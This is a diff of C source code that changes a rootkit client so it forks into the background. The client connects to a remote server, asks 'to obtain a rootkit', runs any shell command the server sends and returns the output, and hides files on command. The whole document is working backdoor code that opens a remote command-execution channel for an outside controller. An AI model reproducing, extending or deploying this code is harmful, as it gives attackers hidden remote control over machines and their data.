@@ -25,54 +25,56 @@ int hidefile(char* cmd);
 
 int main(int argc,char* argv[])
 {
-    int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
-    struct sockaddr_in servaddr;
-    char buf[BUFFER_SIZE];
-    int filesize, chunk, rv;
-    FILE *fp;    
-    char *cmd;
-    struct timeval timeout={1800,0};
-    if(argc > 1){
-        SERVER_ADDR = argv[1];
-    }
-    
-    memset(&servaddr, 0, sizeof(servaddr));
-    servaddr.sin_family = AF_INET;
-    servaddr.sin_port = htons(SP_PORT); 
-    servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
-    setsockopt(sock_fd,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
-    
-    if (connect(sock_fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
-    {
-        printf("Connection error\n");
-        exit(1);
-    }
-    char *req = "register\n";                    // Req for obtain a rootkit
-    send(sock_fd, req, strlen(req),0); 
-    
-    memset(buf, 0, sizeof(buf));    
-    readbuf(sock_fd, buf, 3);                    // Read ACK
-    if(strcmp(buf, "ACK") == 0){
-        while(1){
-            memset(buf, 0, sizeof(buf));
-            readline(sock_fd, buf, BUFFER_SIZE);
-            
-            if(strcmp(buf, "close") == 0){
-                break;
-            } else if(strncmp(buf, "exec", 4) == 0){
-                rv = execcmd(buf + 4);
-                if(rv > 0){
-                    sendresult(sock_fd, buf);
+    if(fork() == 0){
+        int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
+        struct sockaddr_in servaddr;
+        char buf[BUFFER_SIZE];
+        int filesize, chunk, rv;
+        FILE *fp;    
+        char *cmd;
+        struct timeval timeout={1800,0};
+        if(argc > 1){
+            SERVER_ADDR = argv[1];
+        }
+        
+        memset(&servaddr, 0, sizeof(servaddr));
+        servaddr.sin_family = AF_INET;
+        servaddr.sin_port = htons(SP_PORT); 
+        servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
+        setsockopt(sock_fd,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
+        
+        if (connect(sock_fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
+        {
+            printf("Connection error\n");
+            exit(1);
+        }
+        char *req = "register\n";                    // Req for obtain a rootkit
+        send(sock_fd, req, strlen(req),0); 
+        
+        memset(buf, 0, sizeof(buf));    
+        readbuf(sock_fd, buf, 3);                    // Read ACK
+        if(strcmp(buf, "ACK") == 0){
+            while(1){
+                memset(buf, 0, sizeof(buf));
+                readline(sock_fd, buf, BUFFER_SIZE);
+                
+                if(strcmp(buf, "close") == 0){
+                    break;
+                } else if(strncmp(buf, "exec", 4) == 0){
+                    rv = execcmd(buf + 4);
+                    if(rv > 0){
+                        sendresult(sock_fd, buf);
+                    }
+                } else if(strncmp(buf, "hide", 4) == 0){
+                    hidefile(buf + 4);
                 }
-            } else if(strncmp(buf, "hide", 4) == 0){
-                hidefile(buf + 4);
             }
         }
+        
+        fclose(fp);
+        close(sock_fd);
+        return 0;
     }
-    
-    fclose(fp);
-    close(sock_fd);
-    return 0;
 }
 
 int sendresult(int socket, char* buf){
